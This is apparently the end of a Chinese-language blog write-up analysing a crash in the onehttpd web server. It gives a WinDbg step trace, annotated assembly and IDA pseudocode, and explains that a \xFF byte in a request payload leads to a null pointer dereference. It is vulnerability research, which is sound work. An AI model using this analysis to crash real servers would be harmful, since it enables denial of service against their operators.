+eip=004015ab esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+onehttpd+0x15ab:
+004015ab 7f12            jg      onehttpd+0x15bf (004015bf)              [br=1]
+0:000&gt; p
+eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
+eip=004015bf esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+onehttpd+0x15bf:
+004015bf 3c3c            cmp     al,3Ch
+0:000&gt; p
+eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
+eip=004015c1 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
+onehttpd+0x15c1:
+004015c1 740e            je      onehttpd+0x15d1 (004015d1)              [br=0]
+0:000&gt; p
+eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
+eip=004015c3 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
+onehttpd+0x15c3:
+004015c3 3c3e            cmp     al,3Eh
+0:000&gt; p
+eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
+eip=004015c5 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000283
+onehttpd+0x15c5:
+004015c5 740a            je      onehttpd+0x15d1 (004015d1)              [br=0]
+0:000&gt; p
+eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
+eip=004015c7 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000283
+onehttpd+0x15c7:
+004015c7 3c25            cmp     al,25h
+0:000&gt; p
+eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
+eip=004015c9 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+onehttpd+0x15c9:
+004015c9 0f85a8000000    jne     onehttpd+0x1677 (00401677)              [br=1]
+0:000&gt; p
+eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
+eip=00401677 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+onehttpd+0x1677:
+00401677 8b55f0          mov     edx,dword ptr [ebp-10h] ss:0023:0020fc48=003e3818
+0:000&gt; p
+eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004c
+eip=0040167a esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+onehttpd+0x167a:
+0040167a 8802            mov     byte ptr [edx],al          ds:0023:003e3818=00
+0:000&gt; p
+eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004c
+eip=0040167c esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+onehttpd+0x167c:
+0040167c ff45f0          inc     dword ptr [ebp-10h]  ss:0023:0020fc48=003e3818
+0:000&gt; p
+eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004c
+eip=0040167f esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+onehttpd+0x167f:
+0040167f 47              inc     edi
+0:000&gt; p
+eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
+eip=00401680 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+onehttpd+0x1680:
+00401680 8a07            mov     al,byte ptr [edi]          ds:0023:009d004d=ff
+0:000&gt; p
+eax=ffffffff ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
+eip=00401682 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+onehttpd+0x1682:
+00401682 84c0            test    al,al
+0:000&gt; p
+eax=ffffffff ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
+eip=00401684 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
+onehttpd+0x1684:
+00401684 0f850effffff    jne     onehttpd+0x1598 (00401598)              [br=1]
+0:000&gt; p
+eax=ffffffff ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
+eip=00401598 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
+onehttpd+0x1598:
+00401598 3c1f            cmp     al,1Fh//漏洞正是因为此处al与1Fh的cmp指令操作
+0:000&gt; p
+eax=ffffffff ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
+eip=0040159a esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
+onehttpd+0x159a:
+0040159a 0f9fc0          setg    al//al大于1Fh时，al为1则正常，否则al为0，就会造成下面一系列问题，此处ff为负数小于1Fh
+0:000&gt; p                           
+eax=ffffff00 ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
+eip=0040159d esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
+onehttpd+0x159d:
+0040159d 0fb6c0          movzx   eax,al
+0:000&gt; p
+eax=00000000 ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
+eip=004015a0 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
+onehttpd+0x15a0:
+004015a0 f7d8            neg     eax
+0:000&gt; p
+eax=00000000 ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=009d004d
+eip=004015a2 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+onehttpd+0x15a2:
+004015a2 21c7            and     edi,eax
+0:000&gt; p
+eax=00000000 ebx=003e49f8 ecx=00000000 edx=003e3818 esi=0000002a edi=00000000
+eip=004015a4 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+onehttpd+0x15a4:
+004015a4 8a07            mov     al,byte ptr [edi]          ds:0023:00000000=??
+</code></pre><p>PS：注意NEG指令与求补码的区别</p><p>我们利用IDA的F5功能看一下上面汇编的伪代码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>signed</span> <span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>sub_401581</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=n>a1</span><span class=p>,</span> <span class=n>_BYTE</span> <span class=o>*</span><span class=n>a2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// ecx@0
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_BYTE</span> <span class=o>*</span><span class=n>v3</span><span class=p>;</span> <span class=c1>// edi@1
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_BYTE</span> <span class=o>*</span><span class=n>v4</span><span class=p>;</span> <span class=c1>// edi@2
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// al@2
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>v7</span><span class=p>;</span> <span class=c1>// dl@13
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>v8</span><span class=p>;</span> <span class=c1>// si@17
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>v9</span><span class=p>;</span> <span class=c1>// al@17
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v10</span><span class=p>;</span> <span class=c1>// ebx@21
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_BYTE</span> <span class=o>*</span><span class=n>v11</span><span class=p>;</span> <span class=c1>// [sp+Ch] [bp-10h]@1
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=n>a1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>v11</span> <span class=o>=</span> <span class=n>a2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!*</span><span class=n>v3</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=n>v11</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=n>v4</span> <span class=o>=</span> <span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=o>*</span><span class=n>v3</span> <span class=o>&gt;</span> <span class=mi>31</span> <span class=o>?</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=nl>v3</span> <span class=p>:</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>v5</span> <span class=o>=</span> <span class=o>*</span><span class=n>v4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>*</span><span class=n>v4</span> <span class=o>&lt;=</span> <span class=mi>35</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>v5</span> <span class=o>&gt;=</span> <span class=mi>34</span> <span class=o>||</span> <span class=o>!</span><span class=n>v5</span> <span class=o>||</span> <span class=n>v5</span> <span class=o>==</span> <span class=mi>32</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>我们Payload中的\xFF由于是一个负数，所以一定小于31，最后造成了空指针引用</p>           </div>       </article>   </main><div class="disqus markdown"><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//vincebye.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></div><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://github.com/Vincebye/ target=_blank rel="noopener noreferrer me" title=Github><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://twitter.com/vincebye target=_blank rel="noopener noreferrer me" title=Twitter><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></a><a href=mailto:0xvincebye@gmail.com target=_blank rel="noopener noreferrer me" title=Email><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 21" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></a><a href=index.xml target=_blank rel="noopener noreferrer me" title=Rss><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><small class=footer_copyright>© 2023 Vincebye.
+Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel="noreferrer noopener">Hugo blog awesome</a>
+theme on
+<a href=https://gohugo.io target=_blank rel="noreferrer noopener">Hugo</a>.</small></footer><script src=https://vincebye.github.io/js/themeSwitchnMenu.min.2a402288242b6930b175a0722c267e2353055739b3975834df35e56d00dd8f50.js></script></body></html>
